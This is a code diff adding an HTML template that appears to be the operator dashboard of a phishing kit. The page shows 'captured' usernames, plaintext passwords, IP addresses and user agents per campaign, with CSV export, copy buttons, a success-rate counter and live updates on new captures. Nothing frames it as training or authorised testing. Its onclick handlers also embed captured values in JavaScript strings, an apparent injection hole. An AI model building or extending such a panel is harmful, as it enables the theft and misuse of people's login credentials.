@@ -1,0 +1,507 @@
+{% extends "main/base.html" %}
+{% block content %}
+<div class="container py-4">
+    <!-- Hero Section with Particle Effect -->
+    <div class="text-center mb-5 position-relative hero-section">
+        <div id="particles-js"></div>
+        <h1 class="display-4 fw-bold text-gradient mb-3">Captured Data</h1>
+        <p class="lead text-muted">Review and Analyze Your Campaign Results</p>
+        <div class="stats-bar mt-4">
+            <div class="stat-item">
+                <i class="fas fa-trophy text-primary"></i>
+                <span class="stat-value">{{ captured_data|length }}</span>
+                <span class="stat-label">Total Captures</span>
+            </div>
+            <div class="stat-item">
+                <i class="fas fa-chart-line text-success"></i>
+                <span class="stat-value">{{ (captured_data|length > 0) and ((captured_data|length / active_pages_count * 100)|round|int if active_pages_count > 0 else 100) or 0 }}%</span>
+                <span class="stat-label">Success Rate</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Action Bar -->
+    <div class="action-bar mb-4">
+        <div class="search-box">
+            <i class="fas fa-search"></i>
+            <input type="text" id="dataSearch" placeholder="Search captures..." class="form-control">
+        </div>
+        <div class="action-buttons">
+            <a href="{{ url_for('export_csv') }}" class="btn btn-primary me-2">
+                <i class="fas fa-file-export me-2"></i>Export CSV
+            </a>
+            <button class="btn btn-danger" onclick="clearData()">
+                <i class="fas fa-trash-alt me-2"></i>Clear All Data
+            </button>
+        </div>
+    </div>
+
+    <!-- Data Table -->
+    <div class="data-container">
+        {% if captured_data %}
+        <div class="table-responsive">
+            <table class="table table-hover">
+                <thead>
+                    <tr>
+                        <th><i class="fas fa-clock me-2"></i>Time</th>
+                        <th><i class="fas fa-shield-alt me-2"></i>Campaign</th>
+                        <th><i class="fas fa-user me-2"></i>Username</th>
+                        <th><i class="fas fa-key me-2"></i>Password</th>
+                        <th><i class="fas fa-globe me-2"></i>IP Address</th>
+                        <th><i class="fas fa-laptop me-2"></i>User Agent</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for entry in captured_data|reverse %}
+                    <tr class="data-row fade-in">
+                        <td>
+                            <span class="text-muted">{{ entry.timestamp }}</span>
+                        </td>
+                        <td>
+                            <span class="badge bg-gradient">{{ entry.page_type }}</span>
+                        </td>
+                        <td>
+                            <div class="copy-field" onclick="copyToClipboard('{{ entry.username }}')">
+                                {{ entry.username }}
+                                <i class="fas fa-copy ms-2"></i>
+                            </div>
+                        </td>
+                        <td>
+                            <div class="copy-field" onclick="copyToClipboard('{{ entry.password }}')">
+                                {{ entry.password }}
+                                <i class="fas fa-copy ms-2"></i>
+                            </div>
+                        </td>
+                        <td>
+                            <div class="copy-field" onclick="copyToClipboard('{{ entry.ip_address }}')">
+                                {{ entry.ip_address }}
+                                <i class="fas fa-copy ms-2"></i>
+                            </div>
+                        </td>
+                        <td>
+                            <span class="user-agent" title="{{ entry.user_agent }}">
+                                {{ entry.user_agent[:30] + '...' if entry.user_agent|length > 30 else entry.user_agent }}
+                            </span>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+        {% else %}
+        <div class="empty-state">
+            <i class="fas fa-trophy"></i>
+            <h3>No Captured Data</h3>
+            <p>Your captures will appear here once campaigns start collecting data</p>
+            <a href="{{ url_for('start') }}" class="btn btn-gradient mt-3">
+                <i class="fas fa-plus me-2"></i>Create Campaign
+            </a>
+        </div>
+        {% endif %}
+    </div>
+</div>
+
+<style>
+/* Gradient Text Effect */
+.text-gradient {
+    background: linear-gradient(45deg, #6e48aa, #9d50bb, #6e48aa);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: gradient 8s ease infinite;
+    background-size: 200% auto;
+}
+
+@keyframes gradient {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+}
+
+/* Hero Section */
+.hero-section {
+    padding: 3rem 0;
+    position: relative;
+    overflow: hidden;
+}
+
+#particles-js {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    top: 0;
+    left: 0;
+    z-index: 1;
+}
+
+.hero-section h1, .hero-section p {
+    position: relative;
+    z-index: 2;
+}
+
+/* Stats Bar */
+.stats-bar {
+    display: flex;
+    justify-content: center;
+    gap: 3rem;
+    position: relative;
+    z-index: 2;
+}
+
+.stat-item {
+    text-align: center;
+    padding: 1rem;
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 10px;
+    backdrop-filter: blur(10px);
+    transition: transform 0.3s ease;
+}
+
+.stat-item:hover {
+    transform: translateY(-5px);
+}
+
+.stat-item i {
+    font-size: 2rem;
+    margin-bottom: 0.5rem;
+}
+
+.stat-value {
+    display: block;
+    font-size: 2rem;
+    font-weight: bold;
+    margin: 0.5rem 0;
+}
+
+.stat-label {
+    font-size: 0.9rem;
+    color: var(--bs-gray-500);
+}
+
+/* Action Bar */
+.action-bar {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 1rem;
+    margin-bottom: 2rem;
+}
+
+.search-box {
+    position: relative;
+    flex: 1;
+    max-width: 400px;
+}
+
+.search-box i {
+    position: absolute;
+    left: 1rem;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--bs-gray-500);
+}
+
+.search-box input {
+    padding-left: 2.5rem;
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    color: white;
+    border-radius: 10px;
+}
+
+.search-box input:focus {
+    background: rgba(255, 255, 255, 0.1);
+    border-color: rgba(255, 255, 255, 0.2);
+    box-shadow: 0 0 0 0.25rem rgba(110, 72, 170, 0.25);
+    color: white;
+}
+
+.action-buttons {
+    display: flex;
+    gap: 0.5rem;
+}
+
+.btn-primary {
+    background: linear-gradient(45deg, #6e48aa, #9d50bb);
+    border: none;
+    padding: 0.75rem 1.5rem;
+    border-radius: 10px;
+    transition: all 0.3s ease;
+}
+
+.btn-primary:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(110, 72, 170, 0.4);
+}
+
+/* Data Table */
+.data-container {
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 15px;
+    padding: 1.5rem;
+    backdrop-filter: blur(10px);
+}
+
+.table {
+    color: var(--bs-light);
+}
+
+.table th {
+    border-bottom-color: rgba(255, 255, 255, 0.1);
+    font-weight: 600;
+    text-transform: uppercase;
+    font-size: 0.875rem;
+}
+
+.table td {
+    border-bottom-color: rgba(255, 255, 255, 0.05);
+    vertical-align: middle;
+}
+
+.data-row {
+    transition: all 0.2s ease;
+}
+
+.data-row:hover {
+    background: rgba(255, 255, 255, 0.05) !important;
+    transform: scale(1.01);
+}
+
+.badge.bg-gradient {
+    background: linear-gradient(45deg, #6e48aa, #9d50bb);
+    padding: 0.5rem 1rem;
+    font-size: 0.9rem;
+}
+
+.copy-field {
+    cursor: pointer;
+    padding: 0.25rem 0.5rem;
+    border-radius: 5px;
+    transition: all 0.2s ease;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.copy-field:hover {
+    background: rgba(255, 255, 255, 0.1);
+}
+
+.copy-field i {
+    opacity: 0;
+    transition: opacity 0.2s ease;
+}
+
+.copy-field:hover i {
+    opacity: 1;
+}
+
+.user-agent {
+    display: block;
+    max-width: 300px;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+}
+
+/* Empty State */
+.empty-state {
+    padding: 3rem;
+    text-align: center;
+}
+
+.empty-state i {
+    font-size: 4rem;
+    color: var(--bs-gray-600);
+    margin-bottom: 1rem;
+}
+
+.empty-state h3 {
+    font-size: 1.5rem;
+    margin-bottom: 0.5rem;
+}
+
+.empty-state p {
+    color: var(--bs-gray-500);
+    margin-bottom: 1.5rem;
+}
+
+/* Button Styles */
+.btn-gradient {
+    background: linear-gradient(45deg, #6e48aa, #9d50bb);
+    border: none;
+    color: white;
+    padding: 0.75rem 1.5rem;
+    border-radius: 10px;
+    transition: all 0.3s ease;
+}
+
+.btn-gradient:hover {
+    transform: translateY(-2px);
+    color: white;
+    box-shadow: 0 5px 15px rgba(110, 72, 170, 0.4);
+}
+
+/* Animations */
+@keyframes fadeIn {
+    from { 
+        opacity: 0; 
+        transform: translateY(10px); 
+    }
+    to { 
+        opacity: 1; 
+        transform: translateY(0); 
+    }
+}
+
+.fade-in {
+    animation: fadeIn 0.5s ease-in;
+}
+
+/* Toast Notification */
+.toast-notification {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background: rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(10px);
+    border-radius: 10px;
+    padding: 1rem;
+    color: white;
+    z-index: 1000;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    transform: translateY(100px);
+    opacity: 0;
+    transition: all 0.3s ease;
+}
+
+.toast-notification.show {
+    transform: translateY(0);
+    opacity: 1;
+}
+
+.toast-notification i {
+    color: #6e48aa;
+}
+</style>
+
+<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Initialize particles.js
+    particlesJS('particles-js', {
+        particles: {
+            number: { value: 80, density: { enable: true, value_area: 800 } },
+            color: { value: '#6e48aa' },
+            shape: { type: 'circle' },
+            opacity: {
+                value: 0.5,
+                random: false,
+                animation: { enable: true, speed: 1, minimumValue: 0.1, sync: false }
+            },
+            size: {
+                value: 3,
+                random: true,
+                animation: { enable: true, speed: 2, minimumValue: 0.1, sync: false }
+            },
+            line_linked: {
+                enable: true,
+                distance: 150,
+                color: '#6e48aa',
+                opacity: 0.4,
+                width: 1
+            },
+            move: {
+                enable: true,
+                speed: 1,
+                direction: 'none',
+                random: false,
+                straight: false,
+                outMode: 'out',
+                bounce: false,
+            }
+        },
+        interactivity: {
+            detectsOn: 'canvas',
+            events: {
+                onHover: { enable: true, mode: 'grab' },
+                onClick: { enable: true, mode: 'push' },
+                resize: true
+            },
+            modes: {
+                grab: { distance: 140, lineLinked: { opacity: 1 } },
+                push: { particles_nb: 4 }
+            }
+        },
+        retina_detect: true
+    });
+
+    // Setup search functionality
+    const searchInput = document.getElementById('dataSearch');
+    searchInput.addEventListener('input', function() {
+        const query = this.value.toLowerCase();
+        const rows = document.querySelectorAll('.data-row');
+        
+        rows.forEach(row => {
+            const text = row.textContent.toLowerCase();
+            if (text.includes(query)) {
+                row.style.display = '';
+            } else {
+                row.style.display = 'none';
+            }
+        });
+    });
+});
+
+function copyToClipboard(text) {
+    navigator.clipboard.writeText(text).then(() => {
+        showToast('Copied to clipboard!', 'check-circle');
+    });
+}
+
+function clearData() {
+    if (confirm('Are you sure you want to clear all captured data? This action cannot be undone.')) {
+        fetch('/clear_data', { 
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                showToast('All data cleared successfully!', 'check-circle');
+                setTimeout(() => window.location.reload(), 1000);
+            } else {
+                showToast('Error clearing data!', 'exclamation-circle');
+            }
+        });
+    }
+}
+
+function showToast(message, icon) {
+    const toast = document.createElement('div');
+    toast.className = 'toast-notification';
+    toast.innerHTML = `
+        <i class="fas fa-${icon}"></i>
+        <span>${message}</span>
+    `;
+    
+    document.body.appendChild(toast);
+    setTimeout(() => toast.classList.add('show'), 100);
+    
+    setTimeout(() => {
+        toast.classList.remove('show');
+        setTimeout(() => toast.remove(), 300);
+    }, 3000);
+}
+
+// Socket.IO connection for real-time updates
+const socket = io();
+socket.on('new_capture', function(data) {
+    window.location.reload();
+});
+</script>
+{% endblock %} 
